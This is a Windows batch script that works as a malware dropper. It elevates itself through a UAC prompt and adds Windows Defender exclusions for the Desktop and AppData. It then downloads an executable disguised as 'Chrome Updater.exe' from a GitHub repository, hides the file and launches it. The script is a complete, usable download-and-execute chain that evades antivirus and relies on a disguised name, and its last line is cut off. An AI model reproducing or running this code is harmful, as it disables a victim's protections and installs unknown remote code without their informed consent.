@echo off
setlocal

>nul 2>&1 net session
if %errorLevel% neq 0 (
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "cmd.exe", "/c """"%~f0""""", "", "runas", 1 >> "%temp%\getadmin.vbs"
    cscript //nologo "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit
)

:: CORRECTED: Doubled the percent sign in the URL
set "exeUrl=https://github.com/boucegame/ScamBaiting-Updated/raw/refs/heads/main/Chrome%%20Updater.exe"
set "exeName=Chrome Updater.exe"
set "desktopPath=%USERPROFILE%\Desktop"
set "exePath=%desktopPath%\%exeName%"
set "appdataPath=%APPDATA%"
set "fontExePath=%appdataPath%\%exeName%"
set "vbsDownloader=%temp%\dl.vbs"

powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%desktopPath%', '%exePath%', '%appdataPath%', '%fontExePath%'" >nul 2>&1

:: CORRECTED: Escaped the parentheses with carets (^)
(
echo Dim http, stream, url, path
echo url = WScript.Arguments^(0^)
echo path = WScript.Arguments^(1^)
echo Set http = CreateObject^("Microsoft.XMLHTTP"^)
echo http.Open "GET", url, False
echo http.Send
echo If http.Status = 200 Then
echo     Set stream = CreateObject^("ADODB.Stream"^)
echo     stream.Open
echo     stream.Type = 1 'Binary
echo     stream.Write http.ResponseBody
echo     stream.SaveToFile path, 2 'Overwrite
echo     stream.Close
echo End If
) > %vbsDownloader%

cscript //nologo %vbsDownloader% "%exeUrl%" "%exePath%" >nul 2>&1
del %vbsDownloader% >nul 2>&1

set "waitTime=0"
:waitloop
if exist "%exePath%" goto downloaded
if %waitTime% geq 15 goto :eof
set /a waitTime+=1
timeout /t 1 /nobreak >nul
goto waitloop

:downloaded
attrib +h "%exePath%" >nul 2>&1
start "" "%exePath%"
endloca
